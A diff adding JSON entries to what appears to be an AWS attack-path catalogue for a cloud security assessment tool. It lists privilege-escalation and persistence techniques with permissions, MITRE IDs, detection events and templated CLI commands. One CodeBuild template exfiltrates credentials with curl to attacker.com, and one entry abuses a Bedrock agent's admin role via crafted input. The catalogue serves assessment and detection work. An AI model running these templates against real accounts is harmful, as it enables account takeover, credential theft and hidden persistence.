+        "notes": "Look for secretsmanager:GetSecretValue on database credential secrets plus network path from caller to RDS. This is a data-access chain, not always a privilege escalation, but can lead to lateral movement. If DB has access to internal resources (stored procedures, VPC path to EC2), pivot to additional systems."
+      },
+      {
+        "id": "novel-s3-bucket-policy-write",
+        "name": "S3 Bucket Policy Write — Trigger Lambda via bucket write",
+        "category": "novel_patterns",
+        "required_permissions": ["s3:PutBucketPolicy"],
+        "permission_scope": "bucket accessed by a Lambda function with admin role or other automated process",
+        "exploit_template": "aws s3api put-bucket-policy --bucket TARGET_BUCKET --policy '{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:PutObject\",\"Resource\":\"arn:aws:s3:::TARGET_BUCKET/*\"}]}'",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["PutBucketPolicy"],
+        "severity_default": "high",
+        "notes": "Look for s3:PutBucketPolicy on a bucket that is accessed by a Lambda function with admin role (or other automated process). Modify bucket policy to allow attacker to write objects → place malicious payload in bucket → Lambda reads and processes it, executing attacker-controlled code with admin role."
+      },
+      {
+        "id": "novel-cloudformation-changeset",
+        "name": "CloudFormation ChangeSet Escalation — Stack service role creates resources",
+        "category": "novel_patterns",
+        "required_permissions": ["cloudformation:CreateChangeSet", "cloudformation:ExecuteChangeSet"],
+        "permission_scope": "existing CloudFormation stack with a privileged service role",
+        "exploit_template": "aws cloudformation create-change-set --stack-name TARGET_STACK --change-set-name privesc --template-body file://modified.json && aws cloudformation execute-change-set --change-set-name privesc --stack-name TARGET_STACK",
+        "mitre_techniques": ["T1078.004", "T1548", "T1136.003"],
+        "detection_events": ["CreateChangeSet", "ExecuteChangeSet"],
+        "severity_default": "critical",
+        "notes": "Look for cloudformation:CreateChangeSet + cloudformation:ExecuteChangeSet on a stack that uses a privileged service role. Chain: Create a change set that adds IAM resources or modifies security config → execute the change set → stack's service role creates the resources."
+      },
+      {
+        "id": "novel-kms-grant-abuse",
+        "name": "KMS Grant Abuse — Grant bypasses IAM policy entirely",
+        "category": "novel_patterns",
+        "required_permissions": ["kms:CreateGrant"],
+        "permission_scope": "any KMS key",
+        "exploit_template": "aws kms create-grant --key-id KEY_ID --grantee-principal arn:aws:iam::ACCT:user/ATTACKER --operations Decrypt GenerateDataKey",
+        "mitre_techniques": ["T1078.004", "T1530"],
+        "detection_events": ["CreateGrant"],
+        "severity_default": "critical",
+        "notes": "KMS grant bypasses IAM policy entirely — the grant is on the key itself, not the caller's identity policy. Create a grant giving self Decrypt and GenerateDataKey → use grant to decrypt Secrets Manager secrets, EBS volumes, or S3 SSE-KMS objects encrypted with that key."
+      },
+      {
+        "id": "novel-role-chaining-wildcard-trust",
+        "name": "Role Chaining via Trust Policy Wildcards",
+        "category": "novel_patterns",
+        "required_permissions": ["sts:AssumeRole"],
+        "permission_scope": "roles with trust policies containing Principal:* or Principal:{AWS:ACCT:root}",
+        "exploit_template": "aws iam list-roles && aws sts assume-role --role-arn arn:aws:iam::ACCT:role/WILDCARD_TRUST_ROLE --role-session-name privesc",
+        "mitre_techniques": ["T1550.001", "T1078.004"],
+        "detection_events": ["AssumeRole"],
+        "severity_default": "high",
+        "notes": "Look for roles with trust policies containing Principal:* or Principal:{AWS:arn:aws:iam::ACCT:root} (any principal in account can assume). Chain through multiple role assumptions to reach highest privilege. Check for role chaining depth: A → B → C where each trust policy allows the previous role."
+      },
+      {
+        "id": "novel-ec2-launch-template-modification",
+        "name": "EC2 Launch Template Modification (Method 46) — No iam:PassRole needed",
+        "category": "novel_patterns",
+        "required_permissions": ["ec2:CreateLaunchTemplateVersion", "ec2:ModifyLaunchTemplate"],
+        "permission_scope": "launch template used by an Auto Scaling Group with an admin instance profile",
+        "exploit_template": "aws ec2 create-launch-template-version --launch-template-id lt-xxx --source-version 1 --launch-template-data '{\"UserData\":\"BASE64_PAYLOAD\"}' && aws ec2 modify-launch-template --launch-template-id lt-xxx --default-version 2",
+        "mitre_techniques": ["T1078.004", "T1548", "T1552.005"],
+        "detection_events": ["CreateLaunchTemplateVersion", "ModifyLaunchTemplate"],
+        "severity_default": "critical",
+        "notes": "No iam:PassRole needed — the instance profile is inherited from the ASG/launch template configuration. Create new launch template version with malicious user data → set as default version → ASG launches new instances with attacker payload using existing admin instance profile."
+      },
+      {
+        "id": "novel-sts-direct-assumerole",
+        "name": "STS Direct AssumeRole of Overly-Permissive Trust (Method 48)",
+        "category": "novel_patterns",
+        "required_permissions": ["sts:AssumeRole"],
+        "permission_scope": "high-privilege roles with trust policies allowing the caller's account or specific principal",
+        "exploit_template": "aws iam list-roles && aws sts assume-role --role-arn arn:aws:iam::ACCT:role/PERMISSIVE_ROLE --role-session-name privesc",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["AssumeRole"],
+        "severity_default": "critical",
+        "notes": "Often missed because it is not a 'vulnerability' — it is intended behavior. But overly broad trust policies (Principal:{AWS:arn:aws:iam::SAME_ACCT:root}) allow ANY principal in the account to assume the role. Cross-reference all role trust policies with current caller identity."
+      },
+      {
+        "id": "novel-put-user-policy-create-access-key-combo",
+        "name": "PutUserPolicy + CreateAccessKey Combo (Method 49)",
+        "category": "novel_patterns",
+        "required_permissions": ["iam:PutUserPolicy", "iam:CreateAccessKey"],
+        "permission_scope": "target user",
+        "exploit_template": "aws iam put-user-policy --user-name TARGET_USER --policy-name privesc --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' && aws iam create-access-key --user-name TARGET_USER",
+        "mitre_techniques": ["T1548", "T1098.001", "T1078.004"],
+        "detection_events": ["PutUserPolicy", "CreateAccessKey"],
+        "severity_default": "critical",
+        "notes": "Either permission alone is limited; together they are admin-equivalent. Chain: Inject an inline admin policy onto the target user → create access keys for that user → use the new keys with admin permissions."
+      },
+      {
+        "id": "novel-attach-user-policy-create-access-key-combo",
+        "name": "AttachUserPolicy + CreateAccessKey Combo (Method 50)",
+        "category": "novel_patterns",
+        "required_permissions": ["iam:AttachUserPolicy", "iam:CreateAccessKey"],
+        "permission_scope": "target user",
+        "exploit_template": "aws iam attach-user-policy --user-name TARGET_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws iam create-access-key --user-name TARGET_USER",
+        "mitre_techniques": ["T1548", "T1098.001", "T1078.004"],
+        "detection_events": ["AttachUserPolicy", "CreateAccessKey"],
+        "severity_default": "critical",
+        "notes": "Similar to Method 49 (PutUserPolicy + CreateAccessKey) but uses managed policy attachment instead of inline policy injection. Chain: Attach AdministratorAccess to the target user → create access keys → use new keys with admin permissions."
+      },
+      {
+        "id": "new-codebuild-buildspec-overwrite",
+        "name": "CodeBuild Buildspec Overwrite on Existing Project (Method 15b) — No PassRole Required",
+        "category": "novel_patterns",
+        "required_permissions": ["codebuild:UpdateProject", "codebuild:StartBuild"],
+        "permission_scope": "existing CodeBuild project whose service role has admin-level permissions",
+        "exploit_template": "aws codebuild update-project --name TARGET_PROJECT --source '{\"type\":\"NO_SOURCE\",\"buildspec\":\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl -d @/root/.aws/credentials https://attacker.com/creds\"}' && aws codebuild start-build --project-name TARGET_PROJECT",
+        "mitre_techniques": ["T1078.004", "T1059"],
+        "detection_events": ["UpdateProject", "StartBuild"],
+        "severity_default": "critical",
+        "notes": "No PassRole required — admin service role is already on the existing project. This is the CodeBuild equivalent of Method 10 (SageMaker presigned URL on existing notebook). Cross-reference codebuild.json service_role ARNs against iam.json admin roles; flag projects where caller has codebuild:UpdateProject and codebuild:StartBuild."
+      },
+      {
+        "id": "new-rds-iam-auth-abuse",
+        "name": "RDS IAM Database Authentication Abuse",
+        "category": "novel_patterns",
+        "required_permissions": ["rds-db:connect"],
+        "permission_scope": "RDS instance with IAMDatabaseAuthenticationEnabled: true",
+        "exploit_template": "aws rds generate-db-auth-token --hostname DB_ENDPOINT --port 3306 --username DB_USER",
+        "mitre_techniques": ["T1078", "T1530"],
+        "detection_events": ["GenerateDbAuthToken"],
+        "severity_default": "high",
+        "notes": "A principal with rds-db:connect in their IAM policy can authenticate to the RDS instance as any database user without the database password, using a short-lived IAM auth token. If the database has permissive user grants, this allows data access or admin operations. Check rds.json for instances with IAMDatabaseAuthenticationEnabled and cross-reference principal IAM policies for rds-db:connect."
+      },
+      {
+        "id": "new-sns-public-topic-injection",
+        "name": "SNS Public Topic Message Injection",
+        "category": "novel_patterns",
+        "required_permissions": [],
+        "permission_scope": "SNS topic with resource policy Principal:* (no conditions)",
+        "exploit_template": "aws sns publish --topic-arn TARGET_TOPIC_ARN --message '{\"injected\": \"payload\"}'",
+        "mitre_techniques": ["T1190", "T1059"],
+        "detection_events": ["Publish", "SetTopicAttributes"],
+        "severity_default": "high",
+        "notes": "Required: SNS topic with resource policy Principal:* (no conditions) — any AWS principal or anonymous. If the topic has Lambda or SQS subscribers, injecting crafted messages may trigger unintended code execution or data processing with the subscriber's permissions. Check sns.json for topics with policy_public: true or wildcard principal in resource policy."
+      },
+      {
+        "id": "new-sqs-public-queue-injection",
+        "name": "SQS Public Queue Message Injection",
+        "category": "novel_patterns",
+        "required_permissions": [],
+        "permission_scope": "SQS queue with resource policy Principal:* (no conditions)",
+        "exploit_template": "aws sqs send-message --queue-url TARGET_QUEUE_URL --message-body '{\"command\": \"injected\"}'",
+        "mitre_techniques": ["T1190", "T1059"],
+        "detection_events": ["SendMessage", "SetQueueAttributes"],
+        "severity_default": "high",
+        "notes": "Required: SQS queue with resource policy Principal:* (no conditions). If a Lambda function or application consumes from this queue and processes message content without validation, injected messages may cause code execution or data corruption via the consumer's execution role. Check sqs.json for queues with policy_public: true or wildcard principal in queue policy."
+      },
+      {
+        "id": "new-apigateway-unauth-lambda-invoke",
+        "name": "API Gateway Unauthenticated Lambda Invocation",
+        "category": "novel_patterns",
+        "required_permissions": [],
+        "permission_scope": "API Gateway stage/method with no authorizer AND Lambda integration backend",
+        "exploit_template": "curl -X POST https://API_ID.execute-api.REGION.amazonaws.com/STAGE/RESOURCE -d '{\"payload\": \"data\"}'",
+        "mitre_techniques": ["T1190", "T1078"],
+        "detection_events": ["GetResources"],
+        "severity_default": "high",
+        "notes": "Required: API Gateway endpoint without an authorizer (authorization_type: NONE) with Lambda integration backend. The caller indirectly invokes Lambda with the function's execution role — potentially accessing sensitive AWS resources, reading secrets, or triggering privileged operations. Check apigateway.json for methods with authorization_type: NONE and Lambda integrations."
+      },
+      {
+        "id": "new-bedrock-agent-admin-role",
+        "name": "Bedrock Agent Admin Role Escalation",
+        "category": "novel_patterns",
+        "required_permissions": ["bedrock-agent-runtime:InvokeAgent"],
+        "permission_scope": "existing Bedrock agent with an execution role that has admin permissions or iam:PassRole",
+        "exploit_template": "aws bedrock-agent-runtime invoke-agent --agent-id AGENT_ID --agent-alias-id ALIAS_ID --session-id SESSION --input-text 'execute: aws iam list-roles'",
+        "mitre_techniques": ["T1078.004", "T1548"],
+        "detection_events": ["CreateAgent", "ListAgentActionGroups"],
+        "severity_default": "high",
+        "notes": "No new PassRole needed — agent already exists with its execution role. A Bedrock agent's execution role is used when the agent invokes Lambda action groups or accesses AWS resources. If the execution role is admin-level, an attacker who can invoke the agent can perform privileged AWS operations indirectly. Check bedrock.json for agents with admin execution roles and cross-reference who has InvokeAgent permission."
+      },
+      {
+        "id": "novel-sso-permission-set-escalation",
+        "name": "IAM Identity Center Permission Set Escalation — Org-wide role provisioning",
+        "category": "novel_patterns",
+        "required_permissions": ["sso:AttachManagedPolicyToPermissionSet", "sso:ProvisionPermissionSet"],
+        "permission_scope": "IAM Identity Center permission set that the attacker's SSO user already has an assignment for",
+        "exploit_template": "aws sso-admin attach-managed-policy-to-permission-set --instance-arn INSTANCE_ARN --permission-set-arn PERMISSION_SET_ARN --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws sso-admin provision-permission-set --instance-arn INSTANCE_ARN --permission-set-arn PERMISSION_SET_ARN --target-type ALL_PROVISIONED_ACCOUNTS",
+        "mitre_techniques": ["T1078.004", "T1484"],
+        "detection_events": ["AttachManagedPolicyToPermissionSet", "ProvisionPermissionSet"],
+        "severity_default": "critical",
+        "notes": "No PassRole needed. Attaching AdministratorAccess to a permission set and re-provisioning propagates admin access to every AWS account in the organization where that permission set has an assignment. Precondition: attacker must already be an SSO user with an assignment for the target permission set. Check sts.json for organization context (management account, member accounts). If sts.json shows the caller is in an org management account and IAM data shows sso-admin API calls in the trust history, escalation impact radius spans the entire org. Alternative sub-technique: sso-directory:CreateUser + sso:CreateAccountAssignment creates a net-new backdoor SSO user with a chosen permission set assignment."
+      },
+      {
+        "id": "novel-verified-access-policy-injection",
+        "name": "AWS Verified Access Policy Injection — Bypass zero-trust access controls",
+        "category": "novel_patterns",
+        "required_permissions": ["ec2:ModifyVerifiedAccessEndpointPolicy"],
+        "permission_scope": "AWS Verified Access endpoint protecting an internal application",
+        "exploit_template": "aws ec2 describe-verified-access-endpoints && aws ec2 modify-verified-access-endpoint-policy --verified-access-endpoint-id ENDPOINT_ID --policy-enabled true --policy-document '{\"Version\":\"2021-07-15\",\"Statement\":[{\"Effect\":\"Allow\"}]}'",
+        "mitre_techniques": ["T1078", "T1556"],
+        "detection_events": ["ModifyVerifiedAccessEndpointPolicy", "ModifyVerifiedAccessGroupPolicy"],
+        "severity_default": "high",
+        "notes": "AWS Verified Access enforces zero-trust access to internal applications based on trust provider policies (AWS IAM Identity Center, OIDC, or device trust). Injecting a permissive policy that removes the trust provider condition grants network access to the protected application from any AWS principal or the internet, bypassing MFA and device compliance checks. More targeted variant: ec2:ModifyVerifiedAccessTrustProvider + attacker-controlled SAML IdP reroutes authentication through the attacker's IdP. Precondition: Verified Access is only deployed if ec2.json shows VerifiedAccess resources — if absent from ec2.json, this path does not apply. Detection note: ModifyVerifiedAccessEndpointPolicy is not in AWS default alerting rules for most SIEM configurations as of 2026."
+      },
+      {
+        "id": "novel-roles-anywhere-backdoor",
+        "name": "IAM Roles Anywhere Trust Anchor Backdoor — Persistent external credential source",
+        "category": "novel_patterns",
+        "required_permissions": ["rolesanywhere:CreateTrustAnchor", "rolesanywhere:CreateProfile"],
+        "permission_scope": "IAM roles with a trust policy allowing rolesanywhere.amazonaws.com as a service principal",
+        "exploit_template": "aws rolesanywhere create-trust-anchor --name attacker-anchor --source '{\"sourceData\":{\"x509CertificateData\":\"ATTACKER_CA_CERT_PEM\"},\"sourceType\":\"CERTIFICATE_BUNDLE\"}' --enabled && aws rolesanywhere create-profile --name attacker-profile --role-arns '[\"TARGET_ROLE_ARN\"]' --enabled",
+        "mitre_techniques": ["T1553", "T1078.004"],
+        "detection_events": ["CreateTrustAnchor", "CreateProfile"],
+        "severity_default": "high",
+        "notes": "Unlike access key creation, Roles Anywhere backdoors survive access key rotation and credential revocation — the trust relationship is at the IAM trust policy level, not tied to any IAM user credential. After creating the trust anchor with an attacker-controlled CA, any X.509 certificate signed by that CA can call rolesanywhere:CreateSession to obtain temporary credentials for the target role from anywhere on the internet. Check iam.json for roles with rolesanywhere.amazonaws.com in the trust policy; cross-reference who has rolesanywhere:CreateTrustAnchor. Forensic note: if CreateTrustAnchor is seen without a corresponding known change-management event, treat as IOC — this API is rarely called legitimately."
+      },
+      {
+        "id": "novel-service-catalog-portfolio-escalation",
+        "name": "Service Catalog Portfolio Escalation — CloudFormation IAM provisioning via alternate API",
+        "category": "novel_patterns",
+        "required_permissions": ["servicecatalog:CreateProduct", "servicecatalog:AssociatePrincipalWithPortfolio", "cloudformation:CreateStack"],
+        "permission_scope": "Service Catalog portfolio with a launch constraint specifying a service role that can create IAM resources",
+        "exploit_template": "aws servicecatalog create-product --name attacker-product --owner attacker --product-type CLOUD_FORMATION_TEMPLATE --provisioning-artifact-parameters '{\"name\":\"v1\",\"type\":\"CLOUD_FORMATION_TEMPLATE\",\"info\":{\"LoadTemplateFromURL\":\"https://attacker.com/admin-role.yaml\"}}' && aws servicecatalog provision-product --product-id PRODUCT_ID --provisioning-artifact-id ARTIFACT_ID --provisioned-product-name attacker-provision",
+        "mitre_techniques": ["T1548", "T1078.004"],
+        "detection_events": ["CreateProduct", "ProvisionProduct", "CreateStack"],
+        "severity_default": "high",
+        "notes": "Structurally identical to CloudFormation ChangeSet Escalation (Method 6 / novel-cloudformation-changeset) but uses the Service Catalog API path, which is often less restricted or less monitored than direct CloudFormation access. Service Catalog products contain CloudFormation templates; if the launch constraint specifies a service role with iam:CreateRole or iam:AttachRolePolicy, the attacker's template provisions IAM resources with the service role's permissions. The attacker never directly calls IAM APIs — only servicecatalog:ProvisionProduct. Check iam.json for roles with servicecatalog.amazonaws.com trust relationship and broad IAM permissions."
+      },
+      {
+        "id": "novel-organizations-delegated-admin-abuse",
+        "name": "Organizations Delegated Administrator Abuse — Suppress GuardDuty/Config org-wide",
+        "category": "novel_patterns",
+        "required_permissions": ["organizations:RegisterDelegatedAdministrator"],
+        "permission_scope": "AWS Organizations management account or account with delegatable service admin permission",
+        "exploit_template": "aws organizations register-delegated-administrator --account-id ATTACKER_ACCOUNT_ID --service-principal guardduty.amazonaws.com",
+        "mitre_techniques": ["T1562", "T1484"],
+        "detection_events": ["RegisterDelegatedAdministrator", "DeregisterDelegatedAdministrator"],
+        "severity_default": "high",
+        "notes": "Registering an attacker-controlled account as the delegated administrator for GuardDuty, Config, or Security Hub gives that account the ability to modify or suppress threat detection org-wide. Sub-technique: DeregisterDelegatedAdministrator revokes the existing legitimate delegated admin assignment, disrupting security monitoring as a defensive evasion step. Precondition: caller must be in the Organizations management account; sts.json org context field (management_account) determines if this path applies. If sts.json is absent or shows no org context, this path does not apply. Note: organizations:RegisterDelegatedAdministrator is a rarely-used API with no legitimate high-frequency use case — any occurrence should be treated as a high-confidence IOC."
+      }
+    ]
+  },
+  "persistence": {
+    "iam": [
+      {
+        "id": "persist-iam-backdoor-user",
+        "name": "Create backdoor user",
+        "required_permissions": ["iam:CreateUser", "iam:CreateAccessKey"],
+        "what_attacker_achieves": "New long-term credentials that survive rotation of the original",
+        "detection_events": ["CreateUser", "CreateAccessKey"],
+        "severity_default": "critical",
+        "notes": "Survives credential rotation of the original compromised principal. Most durable persistence method."
+      },
+      {
+        "id": "persist-iam-backdoor-role-trust",
+        "name": "Backdoor role trust policy",
+        "required_permissions": ["iam:UpdateAssumeRolePolicy"],
+        "what_attacker_achieves": "External attacker account can AssumeRole indefinitely",
+        "detection_events": ["UpdateAssumeRolePolicy"],
+        "severity_default": "critical",
+        "notes": "Modifies the trust policy of an existing role to add the attacker's account or principal. Survives incident response that only resets credentials."
+      },
+      {
+        "id": "persist-iam-backdoor-policy-version",
+        "name": "Backdoor policy version",
+        "required_permissions": ["iam:CreatePolicyVersion"],
+        "what_attacker_achieves": "Hidden permissive policy version; attacker can switch default later",
+        "detection_events": ["CreatePolicyVersion"],
+        "severity_default": "high",
+        "notes": "Creates a non-default policy version with broad permissions. The version is invisible unless auditors enumerate all policy versions. Attacker can flip it to default at any time."
+      },
+      {
+        "id": "persist-iam-add-attacker-mfa",
+        "name": "Add attacker MFA device",
+        "required_permissions": ["iam:CreateVirtualMFADevice", "iam:EnableMFADevice"],
+        "what_attacker_achieves": "Locks out legitimate user, attacker controls MFA",
+        "detection_events": ["CreateVirtualMFADevice", "EnableMFADevice"],
+        "severity_default": "critical",
+        "notes": "Attacker registers their own MFA device on the target user. If MFA is enforced, legitimate user loses access. Attacker retains it."
+      },
+      {
+        "id": "persist-iam-backdoor-saml-oidc",
+        "name": "Create/backdoor SAML/OIDC provider",
+        "required_permissions": ["iam:CreateSAMLProvider", "iam:UpdateSAMLProvider", "iam:CreateOpenIDConnectProvider"],
+        "what_attacker_achieves": "Federated access via attacker's identity provider",
+        "detection_events": ["CreateSAMLProvider", "UpdateSAMLProvider", "CreateOpenIDConnectProvider"],
+        "severity_default": "critical",
+        "notes": "Attacker registers or modifies a SAML/OIDC provider pointing to infrastructure they control. Any role trusting that provider is now attacker-accessible."
+      },
+      {
+        "id": "persist-iam-disable-mfa",
+        "name": "Disable MFA",
+        "required_permissions": ["iam:DeactivateMFADevice"],
+        "what_attacker_achieves": "Removes MFA barrier for future access",
+        "detection_events": ["DeactivateMFADevice"],
+        "severity_default": "high",
+        "notes": "Deactivates MFA on the compromised principal or other users, enabling password-only authentication for future sessions."
+      }
+    ],
+    "sts": [
+      {
+        "id": "persist-sts-long-lived-tokens",
+        "name": "Long-lived session tokens",
+        "required_permissions": ["sts:GetSessionToken"],
+        "what_attacker_achieves": "36-hour tokens that survive key rotation and can't be enumerated",
+        "detection_events": ["GetSessionToken"],
+        "severity_default": "high",
+        "notes": "GetSessionToken issues tokens valid up to 36 hours. Unlike access keys, these tokens are not listed in IAM — defenders can't enumerate them. Tokens survive static credential rotation."
+      },
+      {
+        "id": "persist-sts-role-chain-juggling",
+        "name": "Role chain juggling",
+        "required_permissions": ["sts:AssumeRole"],
+        "what_attacker_achieves": "Infinite credential refresh loop — indefinite access with no long-term keys",
+        "detection_events": ["AssumeRole"],
+        "severity_default": "high",
+        "notes": "Attacker assumes roles in a cycle (A assumes B, B assumes A or a third role). Each assumption refreshes credentials. With two mutually-trusting roles, access is indefinite with no static keys to rotate."
+      },
+      {
+        "id": "persist-sts-federation-token",
+        "name": "Federation token console access",
+        "required_permissions": ["sts:GetFederationToken"],
+        "what_attacker_achieves": "Stealthy console access that doesn't appear in IAM user list",
+        "detection_events": ["GetFederationToken"],
+        "severity_default": "high",
+        "notes": "GetFederationToken creates long-lived (up to 36 hours) federated sessions. Sessions use the calling user's name as a federated identity — hard to distinguish from legitimate use."
+      }
+    ],
+    "ec2": [
+      {
+        "id": "persist-ec2-lifecycle-manager",
+        "name": "Lifecycle Manager exfiltration",
+        "required_permissions": ["dlm:CreateLifecyclePolicy"],
+        "what_attacker_achieves": "Recurring AMI/snapshot sharing to attacker account",
+        "detection_events": ["CreateLifecyclePolicy"],
+        "severity_default": "high",
+        "notes": "DLM lifecycle policies can share snapshots/AMIs to external accounts on a schedule. Provides ongoing data exfiltration without repeated API calls."
+      },
+      {
+        "id": "persist-ec2-spot-fleet",
+        "name": "Spot Fleet (long-lived)",
+        "required_permissions": ["ec2:RequestSpotFleet", "iam:PassRole"],
+        "what_attacker_achieves": "Up to 5-year compute with high-priv role, auto-beacons to attacker",
+        "detection_events": ["RequestSpotFleet"],
+        "severity_default": "high",
+        "notes": "Spot Fleet requests can have validity periods up to 5 years. Instances run with the passed role and can beacon to attacker C2. Cheaper and longer-lived than On-Demand."
+      },
+      {
+        "id": "persist-ec2-backdoor-launch-template",
+        "name": "Backdoor launch template",
+        "required_permissions": ["ec2:CreateLaunchTemplateVersion", "ec2:ModifyLaunchTemplate"],
+        "what_attacker_achieves": "Every Auto Scaling instance runs attacker code / has attacker SSH key",
+        "detection_events": ["CreateLaunchTemplateVersion", "ModifyLaunchTemplate"],
+        "severity_default": "critical",
+        "notes": "Modifies the default launch template version to include a malicious user data script or attacker SSH key. All future instances from that template are compromised at launch."
+      },
+      {
+        "id": "persist-ec2-replace-root-volume",
+        "name": "Replace root volume",
+        "required_permissions": ["ec2:CreateReplaceRootVolumeTask"],
+        "what_attacker_achieves": "Swap root EBS to attacker-controlled volume; instance keeps its IPs and role",
+        "detection_events": ["CreateReplaceRootVolumeTask"],
+        "severity_default": "critical",
+        "notes": "Replaces the root EBS volume of a running instance with an attacker-controlled snapshot. The instance retains its IP addresses, security groups, and IAM role after the swap."
+      },
+      {
+        "id": "persist-ec2-vpn-into-vpc",
+        "name": "VPN into VPC",
+        "required_permissions": ["ec2:CreateVpnGateway", "ec2:CreateVpnConnection", "ec2:CreateCustomerGateway"],
+        "what_attacker_achieves": "Persistent network-level access into victim VPC",
+        "detection_events": ["CreateVpnGateway", "CreateVpnConnection", "CreateCustomerGateway"],
+        "severity_default": "critical",
+        "notes": "Establishes a Site-to-Site VPN from attacker infrastructure into the victim VPC. Provides persistent L3 access that bypasses security groups and survives instance restarts."
+      },
+      {
+        "id": "persist-ec2-vpc-peering",
+        "name": "VPC peering",
+        "required_permissions": ["ec2:CreateVpcPeeringConnection"],
+        "what_attacker_achieves": "Direct routing between attacker and victim VPCs",
+        "detection_events": ["CreateVpcPeeringConnection"],
+        "severity_default": "high",
+        "notes": "Creates a VPC peering connection between victim VPC and attacker-controlled VPC. Peering connections persist until explicitly deleted."
+      },
+      {
+        "id": "persist-ec2-user-data-backdoor",
+        "name": "User data backdoor",
+        "required_permissions": ["ec2:ModifyInstanceAttribute"],
+        "what_attacker_achieves": "Malicious script runs on next instance start",
+        "detection_events": ["ModifyInstanceAttribute"],
+        "severity_default": "high",
+        "notes": "Modifies instance user data to include a backdoor script. The script executes on the next instance start/reboot, establishing persistence without modifying the AMI."
+      },
+      {
+        "id": "persist-ec2-ssm-state-manager",
+        "name": "SSM State Manager",
+        "required_permissions": ["ssm:CreateAssociation"],
+        "what_attacker_achieves": "Recurring command execution on all SSM-managed instances (every 30 min+)",
+        "detection_events": ["CreateAssociation"],
+        "severity_default": "critical",
+        "notes": "SSM State Manager associations run documents on a schedule across all matching instances. Can target all instances in the account using wildcard resource targeting."
+      }
+    ],
+    "lambda": [
+      {
+        "id": "persist-lambda-layer-backdoor",
+        "name": "Lambda layer backdoor",
+        "required_permissions": ["lambda:PublishLayerVersion", "lambda:UpdateFunctionConfiguration"],
+        "what_attacker_achieves": "Injected code runs on every invocation; function's own code appears clean",
+        "detection_events": ["PublishLayerVersion", "UpdateFunctionConfiguration"],
+        "severity_default": "critical",
+        "notes": "Publishes a malicious Lambda layer and attaches it to target functions. The backdoor code in the layer executes before the function handler. The function's deployment package appears clean in code reviews."
+      },
+      {
+        "id": "persist-lambda-extension",
+        "name": "Lambda extension",
+        "required_permissions": ["lambda:PublishLayerVersion", "lambda:UpdateFunctionConfiguration"],
+        "what_attacker_achieves": "Separate process intercepts/modifies all requests; inherits execution role",
+        "detection_events": ["PublishLayerVersion", "UpdateFunctionConfiguration"],
+        "severity_default": "critical",
+        "notes": "Lambda extensions run as a separate process alongside the function. Unlike layers, extensions can intercept requests/responses and run after the handler returns. They inherit the execution role."
+      },
+      {
+        "id": "persist-lambda-resource-policy-cross-account",
+        "name": "Resource policy (cross-account invoke)",
+        "required_permissions": ["lambda:AddPermission"],
+        "what_attacker_achieves": "External account can invoke/update the function indefinitely",
+        "detection_events": ["AddPermission20150331v2"],
+        "severity_default": "high",
+        "notes": "Adds a resource-based policy granting an attacker-controlled AWS account permission to invoke the function. Survives role rotation and is easy to miss in IAM audits."
+      },
+      {
+        "id": "persist-lambda-weighted-alias",
+        "name": "Weighted alias distribution",
+        "required_permissions": ["lambda:PublishVersion", "lambda:CreateAlias"],
+        "what_attacker_achieves": "Backdoored version receives 1% of traffic — extremely stealthy",
+        "detection_events": ["PublishVersion", "CreateAlias"],
+        "severity_default": "high",
+        "notes": "Publishes a backdoored function version and creates/updates an alias with weighted routing (e.g., 99% legitimate, 1% backdoor). Very low traffic rate makes anomaly detection difficult."
+      },
+      {
+        "id": "persist-lambda-exec-wrapper",
+        "name": "EXEC_WRAPPER env var",
+        "required_permissions": ["lambda:UpdateFunctionConfiguration"],
+        "what_attacker_achieves": "Wrapper script executes before every handler; steals credentials",
+        "detection_events": ["UpdateFunctionConfiguration"],
+        "severity_default": "critical",
+        "notes": "Sets the AWS_LAMBDA_EXEC_WRAPPER environment variable to a path in an attacker-controlled layer. The wrapper runs before every handler invocation and can exfiltrate execution role credentials."
+      },
+      {
+        "id": "persist-lambda-async-self-loop",
+        "name": "Async self-loop",
+        "required_permissions": ["lambda:UpdateFunctionEventInvokeConfig", "lambda:PutFunctionRecursionConfig"],
+        "what_attacker_achieves": "Code-free heartbeat loop; function reinvokes itself via destinations",
+        "detection_events": ["UpdateFunctionEventInvokeConfig", "PutFunctionRecursionConfig"],
+        "severity_default": "high",
+        "notes": "Configures the function to invoke itself asynchronously via on-failure/on-success destinations. Creates a persistent execution loop that doesn't require external triggers."
+      },
+      {
+        "id": "persist-lambda-cron-trigger",
+        "name": "Cron/Event trigger",
+        "required_permissions": ["events:PutRule", "events:PutTargets"],
+        "what_attacker_achieves": "Scheduled or event-driven execution of attacker function",
+        "detection_events": ["PutRule", "PutTargets"],
+        "severity_default": "high",
+        "notes": "Creates an EventBridge rule targeting a Lambda function (attacker's or backdoored). Can trigger on a cron schedule or on specific AWS events (e.g., console login, role assumption)."
+      },
+      {
+        "id": "persist-lambda-alias-scoped-resource-policy",
+        "name": "Alias-scoped resource policy",
+        "required_permissions": ["lambda:AddPermission"],
+        "what_attacker_achieves": "Hidden invoke permission on specific backdoored version only",
+        "detection_events": ["AddPermission20150331v2"],
+        "severity_default": "high",
+        "notes": "Adds a resource policy with a --qualifier scoped to a specific alias or version. The permission only appears when enumerating that specific qualifier, making it easy to miss in broad audits."
+      },
+      {
+        "id": "persist-lambda-freeze-runtime",
+        "name": "Freeze runtime version",
+        "required_permissions": ["lambda:PutRuntimeManagementConfig"],
+        "what_attacker_achieves": "Pins vulnerable runtime; prevents auto-patching",
+        "detection_events": ["PutRuntimeManagementConfig"],
+        "severity_default": "high",
+        "notes": "Pins the Lambda runtime to a specific version using manual update mode. Prevents AWS from auto-applying runtime patches. Preserves any runtime-level vulnerabilities the attacker is exploiting."
+      }
+    ],
+    "storage": [
+      {
+        "id": "persist-storage-s3-acl-backdoor",
+        "name": "S3 ACL backdoor",
+        "required_permissions": ["s3:PutBucketAcl"],
+        "what_attacker_achieves": "Full control via ACLs — often overlooked in audits",
+        "detection_events": ["PutBucketAcl"],
+        "severity_default": "high",
